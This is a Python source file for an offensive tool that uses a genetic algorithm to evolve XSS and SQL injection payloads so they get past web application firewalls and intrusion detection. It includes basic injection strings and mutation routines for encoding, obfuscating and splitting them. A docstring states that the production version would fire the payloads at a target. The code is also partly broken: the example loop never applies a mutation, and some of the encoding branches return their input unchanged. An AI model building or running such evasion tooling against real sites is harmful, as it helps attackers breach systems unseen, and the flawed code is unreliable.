import random
import hashlib
import logging
from typing import Dict, Any, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
import re

logger = logging.getLogger(__name__)

class EvasionTechnique(Enum):
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    FRAGMENTATION = "fragmentation"
    CASE_VARIATION = "case_variation"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    COMMENT_INSERTION = "comment_insertion"
    UNICODE_TRICKS = "unicode_tricks"
    NULL_BYTE = "null_byte"
    DOUBLE_ENCODING = "double_encoding"
    MIXED_ENCODING = "mixed_encoding"

@dataclass
class PayloadGenome:
    """Genetic representation of a payload"""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
    effectiveness_score: float = 0.0
    stealth_score: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'payload': self.payload,
            'fitness': self.fitness,
            'generation': self.generation,
            'evasion_techniques': [t.value for t in self.evasion_techniques],
            'effectiveness_score': self.effectiveness_score,
            'stealth_score': self.stealth_score,
        }

class ExtremePayloadOptimizer:
    """
    Military-grade payload optimizer using genetic algorithms.
    
    Evolves payloads to maximize effectiveness while minimizing
    detection by WAF/IDS systems.
    """
    
    # Base payloads for different vulnerability types
    BASE_PAYLOADS = {
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "data:text/html,<script>alert(1)</script>"
        ],
        'sqli': [
            " OR '1'='1",
            " UNION SELECT * FROM users -- ",
            " AND '1'='1"
        ]
    }
    
    def __init__(self, vulnerability_type: str, **kwargs):
        self.vulnerability_type = vulnerability_type
        self.base_payloads = self.BASE_PAYLOADS.get(vulnerability_type, [])
        self.parameters = kwargs
    
    def create_initial_population(self, population_size: int) -> List[PayloadGenome]:
        """Create initial population of payloads"""
        population = []
        for _ in range(population_size):
            payload = random.choice(self.base_payloads)
            population.append(PayloadGenome(payload))
        return population

    def fitness_function(self, payload: str) -> Tuple[float, float]:
        """
        Example fitness function for testing.
        
        In production, this would:
        - Send payload to target
        - Check if it worked (effectiveness)
        - Check if it was detected (stealth)
        
        Returns:
            Tuple of (effectiveness, stealth)
        """
        # Simplified scoring
        effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
        stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
        stealth = max(0.0, stealth)
        return effectiveness, stealth

    def mutate(self, payload: str) -> str:
        """Apply mutation to payload"""
        mutations = [
            self._mutation_encoding,
            self._mutation_obfuscation,
            self._mutation_case_variation,
            self._mutation_whitespace,
            self._mutation_comment_insertion,
            self._mutation_character_substitution,
        ]
        
        # Apply random mutation
        mutation_func = random.choice(mutations)
        mutated = mutation_func(payload)
        
        return mutated
    
    def _mutation_encoding(self, payload: str) -> str:
        """Apply encoding mutation"""
        encoding_type = random.choice(['url', 'html', 'unicode', 'hex'])
        
        if encoding_type == 'url':
            # URL encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(3, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'%{ord(payload[idx]):02x}'
            return ''.join(result)
        
        elif encoding_type == 'html':
            # HTML entity encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(2, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'&#{ord(payload[idx])};'
            return ''.join(result)
        
        return payload
    
    def _mutation_obfuscation(self, payload: str) -> str:
        """Apply obfuscation mutation"""
        # Add JavaScript obfuscation for XSS
        if self.vulnerability_type == 'xss' and 'alert' in payload.lower():
            obfuscations = [
                lambda p: p.replace('alert', 'top[\'al\'+\'ert\']'),
                lambda p: p.replace('alert', 'window[\'alert\']'),
                lambda p: p.replace('alert', 'eval(\'ale\'+\'rt\')'),
            ]
            return random.choice(obfuscations)(payload)
        
        # Add SQL comment obfuscation
        elif self.vulnerability_type == 'sqli':
            return payload.replace(' ', '/**/') if ' ' in payload else payload
        
        return payload
    
    def _mutation_case_variation(self, payload: str) -> str:
        """Apply case variation mutation"""
        # Randomly change case of some characters
        result = []
        for char in payload:
            if char.isalpha() and random.random() < 0.3:
                result.append(char.swapcase())
            else:
                result.append(char)
        return ''.join(result)
    
    def _mutation_whitespace(self, payload: str) -> str:
        """Apply whitespace manipulation"""
        # Add or remove whitespace
        if random.random() < 0.5:
            # Add spaces
            idx = random.randint(0, len(payload))
            return payload[:idx] + ' ' + payload[idx:]
        else:
            # Remove spaces
            return payload.replace(' ', '')
    
    def _mutation_comment_insertion(self, payload: str) -> str:
        """Insert comments for evasion"""
        if self.vulnerability_type == 'sqli':
            comments = ['/**/', '--', '#']
            comment = random.choice(comments)
            idx = random.randint(0, len(payload))
            return payload[:idx] + comment + payload[idx:]
        
        return payload
    
    def _mutation_character_substitution(self, payload: str) -> str:
        """Substitute characters with equivalents"""
        # For XSS, substitute with HTML entities
        if self.vulnerability_type == 'xss':
            substitutions = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;',
            }
            
            # Randomly apply one substitution
            if random.random() < 0.3:
                for char, entity in substitutions.items():
                    if char in payload and random.random() < 0.5:
                        payload = payload.replace(char, entity, 1)
                        break
        
        return payload
    
    def apply_evasion_technique(self, payload: str, technique: EvasionTechnique) -> str:
        """
        Apply specific evasion technique to payload.
        
        Args:
            payload: Original payload
            technique: Evasion technique to apply
            
        Returns:
            Modified payload
        """
        if technique == EvasionTechnique.ENCODING:
            return self._mutation_encoding(payload)
        
        elif technique == EvasionTechnique.OBFUSCATION:
            return self._mutation_obfuscation(payload)
        
        elif technique == EvasionTechnique.CASE_VARIATION:
            return self._mutation_case_variation(payload)
        
        elif technique == EvasionTechnique.WHITESPACE_MANIPULATION:
            return self._mutation_whitespace(payload)
        
        elif technique == EvasionTechnique.COMMENT_INSERTION:
            return self._mutation_comment_insertion(payload)
        
        else:
            return payload
    
    def get_top_payloads(self, n: int = 5) -> List[PayloadGenome]:
        """Get top N payloads by fitness"""
        return sorted(self.population, key=lambda x: x.fitness, reverse=True)[:n]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get optimizer statistics"""
        if not self.population:
            return {
                'population_size': 0,
                'generation': 0,
                'best_fitness': 0.0,
            }
        
        return {
            'population_size': len(self.population),
            'generation': self.generation,
            'best_fitness': self.best_payload.fitness if self.best_payload else 0.0,
            'avg_fitness': sum(g.fitness for g in self.population) / len(self.population),
            'best_payload': self.best_payload.payload if self.best_payload else None,
        }

def create_payload_optimizer(vulnerability_type: str, **kwargs) -> ExtremePayloadOptimizer:
    """
    Create a payload optimizer instance.
    
    Args:
        vulnerability_type: Type of vulnerability
        **kwargs: Additional parameters for optimizer
        
    Returns:
        ExtremePayloadOptimizer instance
    """
    return ExtremePayloadOptimizer(vulnerability_type, **kwargs)

# Example fitness function
def example_fitness_function(payload: str) -> Tuple[float, float]:
    """
    Example fitness function for testing.
    
    In production, this would:
    - Send payload to target
    - Check if it worked (effectiveness)
    - Check if it was detected (stealth)
    
    Returns:
        Tuple of (effectiveness, stealth)
    """
    # Simplified scoring
    effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
    stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
    stealth = max(0.0, stealth)
    return effectiveness, stealth

# Example usage
optimizer = create_payload_optimizer('xss')
population = optimizer.create_initial_population(10)
optimizer.population = population
optimizer.generation = 1

for _ in range(10):
    for payload in optimizer.population:
        payload.fitness, payload.stealth_score = optimizer.fitness_function(payload.payload)
        payload.efficiency_score = payload.fitness * payload.stealth_score

optimizer.best_payload = max(optimizer.population, key=lambda x: x.efficiency_score)

print(optimizer.get_top_payloads())
